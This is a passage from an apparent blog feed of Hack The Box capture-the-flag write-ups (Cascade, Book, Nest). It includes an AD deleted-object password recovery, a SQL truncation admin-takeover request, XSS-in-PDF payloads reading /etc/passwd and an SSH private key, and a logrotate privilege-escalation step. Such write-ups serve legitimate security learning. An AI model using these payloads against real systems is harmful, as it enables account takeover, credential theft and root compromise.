&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;...
&quot;Password&quot;=hex:6b,cf,2a,4b,6e,5a,ca,0f
...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Using this tool https://github.com/trinitronx/vncpasswd.py it was successfully decrypted and appears we have another password:
&lt;img src=&quot;\assets\images\htb\cascade\vcnpass.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Continuing my SMB enumeration, s.smith had access to Read the Audit$ share, so I mounted it to get a good look at the files.
&lt;img src=&quot;\assets\images\htb\cascade\audit-share-view.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I took a quick glance at the Audit.db file, looks like we have a winner.
&lt;img src=&quot;\assets\images\htb\cascade\sqlite-db.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dnspy-to-the-rescue&quot;&gt;dnSpy to the Rescue&lt;/h3&gt;
&lt;p&gt;Transferred over the files application to a Windows machine, utlizing dnSpy I was able to set a breakpoint in the application to decrypt the password of ArkSvc user: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;w3lc0meFr31nd&lt;/code&gt;
&lt;img src=&quot;\assets\images\htb\cascade\Cascade-HTB.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;shells&quot;&gt;Shells&lt;/h2&gt;

&lt;h3 id=&quot;user-flag&quot;&gt;User Flag&lt;/h3&gt;
&lt;p&gt;Satisfied with SMB enumeration of the files, I utilized Evil-WinRM to login with s.smith user and capture the user flag.
&lt;img src=&quot;\assets\images\htb\cascade\user-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Repeated the use of Evil-WinRM to login with ArkSvc user.
&lt;img src=&quot;\assets\images\htb\cascade\arkscv-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewing Groups it appears that ArkSvc has a unique group.
&lt;img src=&quot;\assets\images\htb\cascade\arksvc-group.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s check on that deleted TempAdmin account. Yep! Gone, but not forgotten.
&lt;img src=&quot;\assets\images\htb\cascade\temp-admin-enum.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewed the properties and noticed our old friend cascadeLegacyPwd.
&lt;img src=&quot;\assets\images\htb\cascade\property-dump.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Primary Commands Utilized:&lt;/p&gt;
&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Get-ADPrincipalGroupMembership&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;arksvc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-IncludeDeletedObjects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-ADObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;CN=TempAdmin\0ADEL:f0cc344d-31e0-4866-bceb-a842791ca059,CN=Deleted Objects,DC=cascade,DC=local&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-IncludeDeletedObjects&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h3&gt;

&lt;p&gt;The decoded base64 of the cascadeLegacyPwd is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;baCT3r1aN00dles&lt;/code&gt; and immediately worked with the Administrator account to capture the root flag.
&lt;img src=&quot;\assets\images\htb\cascade\root-flag.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">Cascade is a well-made, straight-forward machine that is a fun enumeration exercise and requires a bit of .NET debugging.</summary></entry><entry><title type="html">Book Write-Up: HackTheBox</title><link href="https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box/" rel="alternate" type="text/html" title="Book Write-Up: HackTheBox" /><published>2020-07-11T00:00:00-04:00</published><updated>2020-07-11T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/book-write-up-hack-the-box/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\book\book-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;Book was a &lt;em&gt;medium&lt;/em&gt; machine on Hack The Box created by MrR3boot. Initial recon revealed a web application whose user registration is vulnerable to a SQL truncation attack, leading to login as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;. Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, we can inject XSS payloads to read local files through dynamically generated PDFs, which is used to extract a user’s private SSH key. Finally, logged in as the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reader&lt;/code&gt; via SSH, a vulnerable version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logrotate&lt;/code&gt; running as root is discovered, which is exploited to escalate to root.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -Pn -n -p- -T4 -oN nmap/full-book 10.10.10.176&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Nmap revealed two open ports. OpenSSH on port 22 and Apache on port 80.
&lt;img src=&quot;\assets\images\htb\book\book-nmap.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;web-application-enumeration&quot;&gt;Web Application Enumeration&lt;/h2&gt;

&lt;p&gt;Rustbuster doesn’t reveal anything immediately interesting. Lots of redirections!
&lt;img src=&quot;\assets\images\htb\book\book-rustbuster.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Taking a look at the web app through the browser we are greeted with a login prompt and the option to &lt;strong&gt;Sign Up&lt;/strong&gt;.
&lt;img src=&quot;\assets\images\htb\book\book-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I created a test account and logged in.
&lt;img src=&quot;\assets\images\htb\book\book-signup.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Once signed in we see various functionality but nothing that immediately stuck out as vulnerable.
&lt;img src=&quot;\assets\images\htb\book\book-test-signin.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Viewing my profile information, I noticed an interesting behavior. The “t” was missing off of my username. 
&lt;img src=&quot;\assets\images\htb\book\book-test-profile.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I inspected the source and found JS with some validation occuring.&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;validateForm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;myForm&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;forms&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;myForm&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Please fill name field. Should not be more than 10 characters&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;dl&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;Please fill email field. Should not be more than 20 characters&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Exploring further, the authentication mechanism is vulnerable to a SQL truncation attack. This means I can create a user with all the attributes of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; account and add a bit of padding to exceed the character limit and a random character. This user will be accepted but when the user is inserted into the database, it is truncated to the column limit. In this case, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;name&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;email&lt;/code&gt; have a character limit of 10 and 20 respectively. Additionally, I had to change the role parameter (see below). After performing this attack, this allows me to login as the admin user.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /index.php HTTP/1.1
Host: 10.10.10.176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.176/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 81
Connection: close
Cookie: PHPSESSID=cchd42rqq7qeqb0aoueen81nl9
Upgrade-Insecure-Requests: 1

name=admin+++++a&amp;amp;email=admin@book.htb++++++a&amp;amp;password=password&amp;amp;role=administrator
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;REF: &lt;a href=&quot;https://www.suspekt.org/mysql-and-sql-column-truncation-vulnerabilities/&quot; target=&quot;_blank&quot;&gt;MySQL and SQL Column Truncation Vulnerabilities&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Successfully logged in as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt;, we get an Admin Panel with various functionality. Immediately interesting was the “Collections” area that revealed a couple of PDF files.
&lt;img src=&quot;\assets\images\htb\book\book-admin-panel.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;xss-via-pdf&quot;&gt;XSS via PDF&lt;/h2&gt;
&lt;p&gt;I discovered that the application has server side processing of PDFs, which we control the input to via &lt;em&gt;Book Submission&lt;/em&gt; area. Exploitation of this mechanism is documented here:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.noob.ninja/2017/11/local-file-read-via-xss-in-dynamically.html&quot; target=&quot;_blank&quot;&gt;Local File Read via XSS in Dynamically Generated PDF &lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20PDF%20JS&quot; target=&quot;_blank&quot;&gt;PayloadsAllTheThings/Upload Insecure Files/Extension PDF JS&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;In the spirit of payloading all the things, I payloaded the Title, Author, and the uploaded PDF file.
&lt;img src=&quot;\assets\images\htb\book\book-library-payload.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The payload with result to retrieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)};&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;file:///etc/passwd&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;\assets\images\htb\book\book-etc-passwd.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After learning of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reader&lt;/code&gt; user. The payload with result to retrieve &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/reader/.ssh/id_rsa&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;XMLHttpRequest&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(){&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;responseText&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)};&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;GET&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;file:///home/reader/.ssh/id_rsa&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;sr&quot;&gt;/script&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;\assets\images\htb\book\book-reader-idrsa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;breaking-through&quot;&gt;Breaking Through&lt;/h2&gt;
&lt;p&gt;I then extracted the private key text from the pdf, fiddled with formatting it properly, and was able to  get a SSH session as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reader&lt;/code&gt; user. We are in business! I was able to obtain the user flag and start enumerating the machine.
&lt;img src=&quot;\assets\images\htb\book\book-reader-login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used pSpy and noticed an interesting item. Logrotate was running as root.
&lt;img src=&quot;\assets\images\htb\book\book-pspy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;I learned that the version of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logrotate&lt;/code&gt; is 3.11.0 which is vulnerable to a privilege escalation.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;reader@book:~/backups&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;logrotate &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
logrotate 3.11.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;With the &lt;a href=&quot;https://www.exploit-db.com/exploits/47466&quot; target=&quot;_blank&quot;&gt;logrotten 3.15.1 - Privilege Escalation&lt;/a&gt; all versions of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logrotate&lt;/code&gt; through 3.15.1 are vulnerable to this exploit.&lt;/p&gt;

&lt;p&gt;Checking the preconditions that must exist:&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;Logrotate has to be executed as root. (&lt;strong&gt;Verified&lt;/strong&gt;)&lt;/li&gt;
  &lt;li&gt;The logpath needs to be in control of the attacker. (&lt;strong&gt;Verified&lt;/strong&gt;)
    &lt;ul&gt;
      &lt;li&gt;This is in Reader’s home directory. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/reader/backups/access.log&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Any option that creates files is set in the logrotate configuration.
    &lt;ul&gt;
      &lt;li&gt;This precondition I can not verify because the configuration is stored in the root’s home directory, so we might have a bit of guessing.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;I transferred the exploit to the Book machine and compiled it locally. 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gcc -o log logrotten.c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I set up my bash script to be a simple bash reverse shell.
&lt;img src=&quot;\assets\images\htb\book\book-bash-shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The exploit gave the option to change the target directory, but I kept it as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bash_completion.d/&lt;/code&gt;.  I then executed the exploit with our access.log file and executedI &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &quot;test&quot; &amp;gt; /home/reader/backups/access.log&lt;/code&gt; just to be sure a change to the log occured. Once the exploit was complete, I performed some some random terminal autocompletion.
&lt;img src=&quot;\assets\images\htb\book\book-access-log.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;we-are-root&quot;&gt;We Are Root!&lt;/h2&gt;
&lt;p&gt;We got a root shell on the port I was listening on!
&lt;img src=&quot;\assets\images\htb\book\book-set-listener.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The logrotate configuration and root flag.
&lt;img src=&quot;\assets\images\htb\book\book-post-logcfg.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;An interesting look behind the curtain.
&lt;img src=&quot;\assets\images\htb\book\book-post-reset.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>J.D. Grow</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="xxs" /><category term="sqli" /><category term="hacking" /><category term="penetration testing" /><category term="write-ups" /><summary type="html">Book was a medium machine on Hack The Box created by MrR3boot. Initial recon revealed a web application login that is vulnerable to SQL truncation attack, allowing login as `admin`. Once `admin`, we can inject XSS payloads to read local files through dynamically generated PDFs, which is used to extract a user's private SSH key. Finally, logged in as the user `reader` via SSH, a vulnerable version of `logrotate` running as root is discovered, which is exploited to escalate to the root user.</summary></entry><entry><title type="html">Nest Write-Up: Hack The Box</title><link href="https://gr0sabi.github.io/hackthebox/nest-write-up-hack-the-box/" rel="alternate" type="text/html" title="Nest Write-Up: Hack The Box" /><published>2020-06-06T00:00:00-04:00</published><updated>2020-06-06T00:00:00-04:00</updated><id>https://gr0sabi.github.io/hackthebox/nest-write-up-hack-the-box</id><content type="html" xml:base="https://gr0sabi.github.io/hackthebox/nest-write-up-hack-the-box/">&lt;p&gt;&lt;img src=&quot;\assets\images\htb\nest\nest-banner.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;
&lt;p&gt;Nest was an excellent &lt;em&gt;easy&lt;/em&gt;-rated machine on Hack The Box created by VbScrub. Initial recon revealed an open SMB port and an uncommon HQK Reporting service. Enumerating SMB revealed some default credentials, which allowed further read access. Digging further we come across some encrypted credentials and a Visual Basic project. Building the project we are able to decrypt yet another password, but this time for an user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c.smith&lt;/code&gt;. We use the new found creds to go further into the SMB gauntlet and discover the HQK Reporting binary. Tearing it apart with dnSpy, and a touch of reversing, we get the Administrator password and root flag.&lt;/p&gt;

&lt;h2 id=&quot;nmap-port-scan&quot;&gt;Nmap Port Scan&lt;/h2&gt;
&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -sCV -Pn -n -p- -T4 -oN nmap/full-nest 10.10.10.178&lt;/code&gt;&lt;/p&gt;
